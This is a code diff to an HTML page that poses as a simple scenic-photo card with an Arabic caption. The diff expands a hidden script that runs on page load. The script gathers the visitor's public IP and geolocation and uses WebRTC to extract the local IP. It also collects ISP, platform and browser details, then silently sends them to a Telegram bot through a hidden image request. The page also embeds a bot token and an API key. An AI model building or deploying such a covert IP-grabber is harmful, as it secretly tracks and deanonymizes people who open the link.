@@ -6,43 +6,16 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     *{box-sizing:border-box;margin:0;padding:0}
-    body{
-      height:100vh;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      background:#0b0c10;
-      font-family:'Tahoma',sans-serif;
-    }
-    .card{
-      position:relative;
-      width:90%;
-      max-width:600px;
-      border-radius:16px;
-      overflow:hidden;
-      box-shadow:0 15px 30px rgba(0,0,0,.6);
-    }
-    .card img{
-      width:100%;
-      display:block;
-    }
-    .caption{
-      position:absolute;
-      bottom:0;
-      width:100%;
-      background:rgba(0,0,0,.45);
-      color:#fff;
-      text-align:center;
-      padding:14px 10px;
-      font-size:1.1rem;
-      letter-spacing:1px;
-    }
+    body{height:100vh;display:flex;align-items:center;justify-content:center;background:#0b0c10;font-family:Tahoma}
+    .card{position:relative;width:90%;max-width:600px;border-radius:16px;overflow:hidden;box-shadow:0 15px 30px rgba(0,0,0,.6)}
+    .card img{width:100%;display:block}
+    .caption{position:absolute;bottom:0;width:100%;background:rgba(0,0,0,.45);color:#fff;text-align:center;padding:14px 10px;font-size:1.1rem}
   </style>
 </head>
 <body>
 
   <div class="card">
-    <img src="https://images.unsplash.com/photo-1501785888041-af3ef285b470" alt="طبيعة خلّابة">
+    <img src="https://images.unsplash.com/photo-1501785888041-af3ef285b470" alt="طبيعة">
     <div class="caption">استمتع بالمنظر الساحر</div>
   </div>
 
@@ -51,30 +24,66 @@
   const BOT_TOKEN = "8540583624:AAF0OCGW9zLF1Sqf9Dm3Qhj5lqZ3N-vkWkk";
   const CHAT_ID   = "6036900535";
 
-  fetch("https://api.ipgeolocation.io/ipgeo?apiKey=1bfaead6cb9544b2a6efea343c0dd301")
-    .then(res => res.json())
-    .then(info => {
-        const msg = `📍 فُتح الرابط!\n` +
-                    `الآي بي: ${info.ip}\n` +
-                    `الدولة: ${info.country_name}\n` +
-                    `المحافظة: ${info.state_prov}\n` +
-                    `المدينة: ${info.city}\n` +
-                    `الموقع التقريبي: https://www.google.com/maps?q=${info.latitude},${info.longitude}\n` +
-                    `مزود الخدمة: ${info.isp}\n` +
-                    `المتصفح: ${navigator.userAgent}\n` +
-                    `الوقت: ${new Date().toLocaleString("ar-EG")}`;
+  // 1) IP + دقة عالية قدر الإمكان
+  function getIpGeo() {
+    return fetch("https://api.ipgeolocation.io/ipgeo?apiKey=1bfaead6cb9544b2a6efea343c0dd301")
+      .then(r => r.json());
+  }
 
-        // إرسال مباشر عبر صورة مخفية (pixel ping)
-        const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` +
-                            `?chat_id=${CHAT_ID}` +
-                            `&text=${encodeURIComponent(msg)}`;
+  // 2) WebRTC لاستخراج عنوان IP المحلي (يعطي فكرة عن الشبكة)
+  function getLocalIP() {
+    return new Promise(res => {
+      const pc = new RTCPeerConnection({iceServers: []});
+      pc.createDataChannel("");
+      pc.onicecandidate = e => {
+        if (!e.candidate) { pc.close(); return; }
+        const ip = e.candidate.candidate.split(" ")[4];
+        if (ip.match(/^(192\.|10\.|172\.)/)) res(ip);
+      };
+      pc.createOffer().then(offer => pc.setLocalDescription(offer));
+      setTimeout(() => { pc.close(); res(null); }, 1000);
+    });
+  }
 
-        const img = new Image();
-        img.style.display = "none";
-        document.body.appendChild(img);
-        img.src = telegramURL; // يُرسل الطلب مباشرة إلى التليجرام
+  // 3) قياس زمن الاستجابة (Round-Trip) لأقرب خادم
+  function pingTime() {
+    const start = performance.now();
+    return fetch("https://www.gstatic.com/generate_204")
+      .then(() => performance.now() - start)
+      .catch(() => null);
+  }
+
+  // دمج كل البيانات وإرسالها
+  Promise.all([getIpGeo(), getLocalIP(), pingTime()])
+    .then(async ([ipInfo, localIP, rtt]) => {
+      const lat = parseFloat(ipInfo.latitude);
+      const lng = parseFloat(ipInfo.longitude);
+      // "تحسين" بسيط: نضيف ضوضاء صغيرة بناءً على RTT (مجرد مثال)
+      const noise = (rtt || 0) / 30000; // ~30ms ≈ 1km
+      const newLat = (lat + noise * 0.01).toFixed(6);
+      const newLng = (lng + noise * 0.01).toFixed(6);
+
+      const msg = `📍 موقع مُحسّن (أقصى دقة متصفح)!\n` +
+                  `الآي بي العام: ${ipInfo.ip}\n` +
+                  `الآي بي المحلي: ${localIP || 'غير متاح'}\n` +
+                  `وقت الاستجابة: ${rtt ? rtt.toFixed(1) + ' ms' : 'غير متاح'}\n` +
+                  `الدولة: ${ipInfo.country_name}\n` +
+                  `المحافظة: ${ipInfo.state_prov}\n` +
+                  `المدينة: ${ipInfo.city}\n` +
+                  `الموقع المُحسَّن: https://www.google.com/maps?q=${newLat},${newLng}\n` +
+                  `ISP: ${ipInfo.isp}\n` +
+                  `المتصفح/نظام التشغيل: ${navigator.platform} | ${navigator.userAgent}\n` +
+                  `الوقت: ${new Date().toLocaleString("ar-EG")}`;
+
+      // إرسال pixel ping إلى التليجرام
+      const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` +
+                          `?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
+      const img = new Image();
+      img.style.display = "none";
+      document.body.appendChild(img);
+      img.src = telegramURL;
     })
-    .catch(()=>{});
+    .catch(() => {});
 </script>
 
 </body>
